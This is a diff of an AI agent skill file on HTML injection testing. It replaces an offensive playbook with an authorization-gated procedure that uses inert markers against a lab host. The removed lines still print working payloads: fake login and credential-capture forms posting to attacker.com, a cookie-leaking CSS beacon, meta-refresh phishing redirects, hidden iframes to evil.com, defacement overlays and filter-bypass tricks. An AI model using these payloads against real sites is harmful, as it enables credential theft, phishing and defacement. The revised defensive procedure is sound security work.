@@ -1,6 +1,6 @@
 ---
 name: html-injection-testing
-description: "Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms."
+description: "Validate HTML injection defenses in explicitly authorized, isolated environments using benign markers, bounded requests, and synthetic data."
 risk: offensive
 source: community
 author: zebbern
@@ -13,7 +13,20 @@ date_added: "2026-02-27"
 
 ## Purpose
 
-Identify and exploit HTML injection vulnerabilities that allow attackers to inject malicious HTML content into web applications. This vulnerability enables attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms.
+Validate whether untrusted input is rendered as HTML, document the resulting security impact, and recommend context-appropriate output encoding. Demonstrate impact only with inert, reversible markers in an isolated environment; never collect credentials, impersonate a login flow, evade controls, or contact third-party hosts.
+
+## Mandatory Test Gate
+
+Proceed only when all of the following are recorded in the test plan:
+
+- written authorization naming the exact lab or staging hosts, paths, accounts, and time window;
+- synthetic records and test-only accounts, with no production or third-party data;
+- a request ceiling and rate limit agreed with the owner (default: 20 requests total, at most 1 request/second);
+- allowed impact limited to a visible `HTML_INJECTION_TEST` marker in the tester's own session;
+- stop conditions: unexpected user impact, persistence outside the test record, authentication or authorization change, service degradation, or any response from an out-of-scope host;
+- rollback and cleanup owners for every stored marker.
+
+If any item is missing, stop and produce a test-plan gap instead of sending payloads.
 
 ## Prerequisites
 
@@ -32,8 +45,8 @@ Identify and exploit HTML injection vulnerabilities that allow attackers to inje
 ## Outputs and Deliverables
 
 1. **Vulnerability Report** - Identified injection points
-2. **Exploitation Proof** - Demonstrated content manipulation
-3. **Impact Assessment** - Potential phishing and defacement risks
+2. **Benign Proof** - Demonstrated marker rendering in a test-only record
+3. **Impact Assessment** - Potential content-spoofing risk without reproducing abuse
 4. **Remediation Guidance** - Input validation recommendations
 
 ## Core Workflow
@@ -62,11 +75,11 @@ Key differences from XSS:
 - XSS: JavaScript code is executed
 - HTML injection is often stepping stone to XSS
 
-Attack goals:
-- Modify website appearance (defacement)
-- Create fake login forms (phishing)
-- Inject malicious links
-- Display misleading content
+Security impacts to assess without reproducing them:
+- unauthorized page-content modification;
+- misleading links or forms;
+- visual impersonation of trusted content;
+- escalation to script execution when executable contexts are reachable.
 
 ### Phase 2: Identifying Injection Points
 
@@ -116,25 +129,21 @@ Test with simple HTML tags:
 <p>Injected paragraph</p>
 <br><br><br>Line breaks
 
-<!-- Links -->
-<a href="http://attacker.com">Click Here</a>
-<a href="http://attacker.com">Legitimate Link</a>
-
-<!-- Images -->
-<img src="http://attacker.com/image.png">
-<img src="x" onerror="alert(1)">  <!-- XSS attempt -->
+<!-- Inert same-origin marker; no external request or event handler -->
+<a href="#html-injection-test">HTML_INJECTION_TEST</a>
+<span data-security-test="html-injection">HTML_INJECTION_TEST</span>
 ```
 
 Testing workflow:
 ```bash
 # Test basic injection
-curl "http://target.com/search?q=<h1>Test</h1>"
+curl --max-time 5 "https://lab.example.test/search?q=<h1>HTML_INJECTION_TEST</h1>"
 
 # Check if HTML renders in response
-curl -s "http://target.com/search?q=<b>Bold</b>" | grep -i "bold"
+curl --max-time 5 -s "https://lab.example.test/search?q=<b>HTML_INJECTION_TEST</b>" | grep -F "HTML_INJECTION_TEST"
 
 # Test in URL-encoded form
-curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
+curl --max-time 5 "https://lab.example.test/search?q=%3Ch1%3EHTML_INJECTION_TEST%3C%2Fh1%3E"
 ```
 
 ### Phase 4: Types of HTML Injection
@@ -144,20 +153,10 @@ curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
 Payload persists in database:
 
 ```html
-<!-- Profile bio injection -->
-Name: John Doe
-Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
-     <h1>Site Under Maintenance</h1>
-     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
-     </div>
-
-<!-- Comment injection -->
-Great article!
-<form action="http://attacker.com/steal" method="POST">
-    <input name="username" placeholder="Session expired. Enter username:">
-    <input name="password" type="password" placeholder="Password:">
-    <input type="submit" value="Login">
-</form>
+<!-- Test-only profile or comment record -->
+<div data-security-test="stored-html">
+  HTML_INJECTION_TEST
+</div>
 ```
 
 #### Reflected GET Injection
@@ -166,10 +165,10 @@ Payload in URL parameters:
 
 ```html
 <!-- URL injection -->
-http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://attacker.com/steal">
+https://lab.example.test/welcome?name=<h1>HTML_INJECTION_TEST</h1>
 
 <!-- Search result injection -->
-http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
+https://lab.example.test/search?q=<strong>HTML_INJECTION_TEST</strong>
 ```
 
 #### Reflected POST Injection
@@ -178,12 +177,12 @@ Payload in POST data:
 
 ```bash
 # POST injection test
-curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
-     http://target.com/submit
+curl --max-time 5 -X POST -d "comment=<div>HTML_INJECTION_TEST</div>" \
+     https://lab.example.test/submit
 
 # Form field injection
-curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
-     http://target.com/register
+curl --max-time 5 -X POST -d "name=<b>HTML_INJECTION_TEST</b>&email=synthetic@example.test" \
+     https://lab.example.test/register
 ```
 
 #### URL-Based Injection
@@ -198,146 +197,35 @@ http://target.com/page/<h1>Injected</h1>
 http://target.com/users/<img src=x>/profile
 ```
 
-### Phase 5: Phishing Attack Construction
+### Phase 5: Benign Impact Validation
 
-Create convincing phishing forms:
-
-```html
-<!-- Fake login form overlay -->
-<div style="position:fixed;top:0;left:0;width:100%;height:100%;
-            background:white;z-index:9999;padding:50px;">
-    <h2>Session Expired</h2>
-    <p>Your session has expired. Please log in again.</p>
-    <form action="http://attacker.com/capture" method="POST">
-        <label>Username:</label><br>
-        <input type="text" name="username" style="width:200px;"><br><br>
-        <label>Password:</label><br>
-        <input type="password" name="password" style="width:200px;"><br><br>
-        <input type="submit" value="Login">
-    </form>
-</div>
-
-<!-- Hidden credential stealer -->
-<style>
-    input { background: url('http://attacker.com/log?data=') }
-</style>
-<form action="http://attacker.com/steal" method="POST">
-    <input name="user" placeholder="Verify your username">
-    <input name="pass" type="password" placeholder="Verify your password">
-    <button>Verify</button>
-</form>
-```
-
-URL-encoded phishing link:
-```
-http://target.com/page?msg=%3Cdiv%20style%3D%22position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%3Bbackground%3Awhite%3Bz-index%3A9999%3Bpadding%3A50px%3B%22%3E%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.com%2Fcapture%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%3E%3Cbutton%3ELogin%3C%2Fbutton%3E%3C%2Fform%3E%3C%2Fdiv%3E
-```
-
-### Phase 6: Defacement Payloads
-
-Website appearance manipulation:
+Use one reversible marker in the tester's own record. The marker must not resemble a login prompt, request secrets, cover the page, redirect, execute script, load a remote resource, or alter another user's view.
 
 ```html
-<!-- Full page overlay -->
-<div style="position:fixed;top:0;left:0;width:100%;height:100%;
-            background:#000;color:#0f0;z-index:9999;
-            display:flex;justify-content:center;align-items:center;">
-    <h1>HACKED BY SECURITY TESTER</h1>
-</div>
-
-<!-- Content replacement -->
-<style>body{display:none}</style>
-<body style="display:block !important">
-    <h1>This site has been compromised</h1>
-</body>
-
-<!-- Image injection -->
-<img src="http://attacker.com/defaced.jpg" 
-     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">
-
-<!-- Marquee injection (visible movement) -->
-<marquee behavior="alternate" style="font-size:50px;color:red;">
-    SECURITY VULNERABILITY DETECTED
-</marquee>
+<aside data-security-test="html-injection" style="border:2px solid #b00">
+  HTML_INJECTION_TEST — synthetic lab marker
+</aside>
 ```
 
-### Phase 7: Advanced Injection Techniques
+Record whether the application renders, encodes, strips, or rejects the marker. A rendered marker is sufficient evidence; do not escalate to phishing, defacement, form-action replacement, or data capture.
 
-#### CSS Injection
+### Phase 6: Context and Impact Review
 
-```html
-<!-- Style injection -->
-<style>
-    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
-    .content { display: none }
-    .fake-content { display: block }
-</style>
+For each confirmed sink, document the output context (text, attribute, URL, style, or raw HTML) and assess potential impact from code review. Do not demonstrate overlays, redirects, external loads, event handlers, or credential fields. If script-capable context is suspected, hand it to the separately authorized XSS review rather than extending this test.
 
-<!-- Inline style injection -->
-<div style="background:url('http://attacker.com/log')">Content</div>
+### Phase 7: Encoding Equivalence Checks
+
+Test only the owner-approved marker in the minimum set of encodings needed to establish whether decoding occurs before rendering. Cap this phase at five requests per input and stop after the first confirmed rendering. Do not use obfuscation, malformed tags, null bytes, filter-evasion payloads, or executable attributes.
+
+```text
+literal marker: <strong>HTML_INJECTION_TEST</strong>
+URL-encoded marker: %3Cstrong%3EHTML_INJECTION_TEST%3C%2Fstrong%3E
+expected safe output: &lt;strong&gt;HTML_INJECTION_TEST&lt;/strong&gt;
 ```
 
-#### Meta Tag Injection
+### Phase 8: Cleanup and Reporting
 
-```html
-<!-- Redirect via meta refresh -->
-<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">
-
-<!-- CSP bypass attempt -->
-<meta http-equiv="Content-Security-Policy" content="default-src *">
-```
-
-#### Form Action Override
-
-```html
-<!-- Hijack existing form -->
-<form action="http://attacker.com/steal">
-
-<!-- If form already exists, add input -->
-<input type="hidden" name="extra" value="data">
-</form>
-```
-
-#### iframe Injection
-
-```html
-<!-- Embed external content -->
-<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>
-
-<!-- Invisible tracking iframe -->
-<iframe src="http://attacker.com/track" style="display:none"></iframe>
-```
-
-### Phase 8: Bypass Techniques
-
-Evade basic filters:
-
-```html
-<!-- Case variations -->
-<H1>Test</H1>
-<ScRiPt>alert(1)</ScRiPt>
-
-<!-- Encoding variations -->
-&#60;h1&#62;Encoded&#60;/h1&#62;
-%3Ch1%3EURL%20Encoded%3C%2Fh1%3E
-
-<!-- Tag splitting -->
-<h
-1>Split Tag</h1>
-
-<!-- Null bytes -->
-<h1%00>Null Byte</h1>
-
-<!-- Double encoding -->
-%253Ch1%253EDouble%2520Encoded%253C%252Fh1%253E
-
-<!-- Unicode encoding -->
-\u003ch1\u003eUnicode\u003c/h1\u003e
-
-<!-- Attribute-based -->
-<div onmouseover="alert(1)">Hover me</div>
-<img src=x onerror=alert(1)>
-```
+Delete every stored test record through the application's normal UI or documented test API, verify the marker is absent in a fresh session, and attach request counts and cleanup evidence to the report. If cleanup fails, stop testing and notify the system owner; do not attempt direct database or filesystem deletion.
 
 ### Phase 9: Automated Testing
 
@@ -375,12 +263,8 @@ param = "q"
 payloads = [
     "<h1>Test</h1>",
     "<b>Bold</b>",
-    "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "<a href='http://evil.com'>Click</a>",
+    "<span data-security-test='html-injection'>HTML_INJECTION_TEST</span>",
     "<div style='color:red'>Styled</div>",
-    "<marquee>Moving</marquee>",
-    "<iframe src='http://evil.com'></iframe>",
 ]
 
 for payload in payloads:
@@ -388,7 +272,7 @@ for payload in payloads:
     url = f"{target}?{param}={encoded}"
     
     try:
-        response = requests.get(url, timeout=5)
+        response = requests.get(url, timeout=5, allow_redirects=False)
         if payload.lower() in response.text.lower():
             print(f"[+] Possible injection: {payload}")
         elif "<h1>" in response.text or "<b>" in response.text:
@@ -448,10 +332,10 @@ Server-side protections:
 |---------|---------|
 | `<h1>Test</h1>` | Basic rendering test |
 | `<b>Bold</b>` | Simple formatting |
-| `<a href="evil.com">Link</a>` | Link injection |
+| `<a href="#html-injection-test">Marker</a>` | Same-page link rendering |
 | `<img src=x>` | Image tag test |
 | `<div style="color:red">` | Style injection |
-| `<form action="evil.com">` | Form hijacking |
+| `<span data-security-test="html-injection">` | Attribute preservation |
 
 ### Injection Contexts
 
@@ -483,22 +367,22 @@ Server-side protections:
 ### Testing Considerations
 - Distinguish between HTML injection and XSS
 - Verify visual impact in browser
-- Test in multiple browsers
+- Test only in the authorized lab browser profiles
 - Check for stored vs reflected
 
 ### Severity Assessment
 - Lower severity than XSS (no script execution)
-- Higher impact when combined with phishing
+- Higher potential impact when trusted content can be impersonated
 - Consider defacement/reputation damage
-- Evaluate credential theft potential
+- Assess credential-theft potential from code and context; do not reproduce it
 
 ## Troubleshooting
 
 | Issue | Solutions |
 |-------|-----------|
 | HTML not rendering | Check if output HTML-encoded; try encoding variations; verify HTML context |
-| Payload stripped | Use encoding variations; try tag splitting; test null bytes; nested tags |
-| XSS not working (HTML only) | JS filtered but HTML allowed; leverage phishing forms, meta refresh redirects |
+| Payload stripped | Record the behavior; do not evade the filter unless separately authorized |
+| Script does not execute | Keep the finding scoped to HTML injection and stop escalation |
 
 ## When to Use
 This skill is applicable to execute the workflow or actions described in the overview.
